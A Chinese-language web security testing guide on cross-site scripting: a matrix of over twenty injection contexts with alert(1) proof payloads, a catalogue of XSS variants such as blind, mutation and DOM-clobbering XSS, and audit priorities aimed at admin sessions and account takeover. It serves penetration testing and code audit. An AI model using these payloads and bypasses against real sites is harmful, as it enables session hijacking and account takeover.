## 一、XSS完整攻击面与威胁建模

### 1.1 注入位置分类（20+上下文矩阵）
| 位置 | 上下文 | 测试方法 |
|------|-------|---------|
| HTML标签之间 | `<div>USERINPUT</div>` | `<script>alert(1)</script>` |
| HTML属性值 | `<input value="USERINPUT">` | `" onfocus=alert(1) autofocus x="` |
| HTML属性名 | `<div USERINPUT>` | `onmouseover=alert(1)` |
| HTML标签名 | `<USERINPUT href="/">` | `img src=x onerror=alert(1)` |
| JavaScript块 | `<script>var x="USERINPUT"</script>` | `";alert(1);//` |
| JS字符串（单引号/双引号/反引号）| 同上 | 对应闭合+payload |
| JS注释内 | `var x=/*USERINPUT*/` | `*/alert(1);/*` |
| JS模板字面量 | `` var x=`USERINPUT` `` | `${alert(1)}` |
| CSS样式 | `<style>body{color:USERINPUT}</style>` | `</style><script>alert(1)</script>` |
| CSS属性值 | `<div style="color:USERINPUT">` | `red;background:url(javascript:alert(1))` |
| URL属性（href/src/action）| `<a href="USERINPUT">` | `javascript:alert(1)` |
| JSON响应 | `{"name":"USERINPUT"}` | `"}</script><script>alert(1)</script>` |
| SVG/MathML | `<svg><script>alert(1)</script></svg>` | SVG命名空间不遵循HTML规则 |
| Markdown渲染 | 评论/文章渲染 | `[x](javascript:alert(1))`、`<img src=x onerror=alert(1)>` |
| 富文本编辑器 | UEditor/CKEditor/TinyMCE | 标签/事件白名单绕过 |
| POST/JSON参数 | API请求体 | JSON字段XSS、Content-Type变换 |
| URL Path | `/user/<USERINPUT>/profile` | 路径XSS、URL编码绕过 |
| Hash片段 | `#USERINPUT` | DOM XSS（不发往服务器，WAF不可见） |
| Cookie | Cookie值回显 | Cookie注入+XSS |
| Referer/User-Agent | 日志/统计页面UA回显 | 日志XSS/HTTP头注入 |
| 自定义HTTP头 | X-Forwarded-For等 | 头注入XSS |
| iframe srcdoc | `<iframe srcdoc="USERINPUT">` | srcdoc注入 |
| WebSocket消息 | 前端实时渲染 | 消息内容XSS（绕过HTTP层防御） |
| SVG文件上传 | 头像/签名/表情 | SVG内嵌script/XSS，二次加载 |
| PDF生成 | 报表/导出功能 | PDF内HTML注入，浏览器打开执行JS |
| 日志查看器 | 管理后台日志回显 | Blind XSS → 管理员会话 |

### 1.2 XSS类型扩展
- **反射型XSS（Reflected）**：URL参数即时回显，一次性，需社工诱导点击
- **存储型XSS（Stored/Persistent）**：恶意代码存入数据库/文件，影响所有访问用户，危害最大
- **DOM型XSS**：前端JS直接操作DOM引入（不经过服务器，WAF/服务端防护全部失效）
- **mXSS（突变XSS）**：浏览器对innerHTML解析后发生突变，是Sanitizer绕过的核心武器
- **vXSS（VBScript XSS）**：IE兼容模式VBScript执行
- **Universal XSS（uXSS）**：浏览器/插件漏洞导致跨源，0-click
- **Self-XSS**：需诱导用户自己输入，结合CSRF组合升级为ATO
- **Blind XSS（盲打XSS）**：在后台管理页/日志/工单系统中触发（无回显），配合xss.ht等平台自动化
- **PDF XSS**：PDF生成中的XSS，浏览器打开执行JS
- **Flash XSS**：ActionScript中的XSS（老版本）
- **PostMessage XSS**：不安全的postMessage监听
- **WebWorker XSS**：Worker中执行脚本绕过CSP
- **Service Worker XSS**：注册恶意Service Worker持久化，跨页面劫持
- **模板注入XSS（CSTI）**：客户端模板引擎（Angular/Vue/Mustache）表达式执行
- **原型污染→XSS**：通过`__proto__`污染对象属性，改变库的预期行为触发sink
- **DOM Clobbering XSS**：利用HTML元素name/id覆盖DOM属性，劫持应用逻辑

### 1.3 威胁建模优先级
1. 优先审计**存储型+DOM型组合**（管理后台+富文本渲染）——影响面最大
2. 优先审计**登录态上下文**（密码修改、支付、设置页）——可直接升级为ATO
3. 优先审计**日志/工单/客服系统**——Blind XSS打管理员
4. 其次：反射型（需要诱导）、Self-XSS（需链式）、uXSS（浏览器0day）

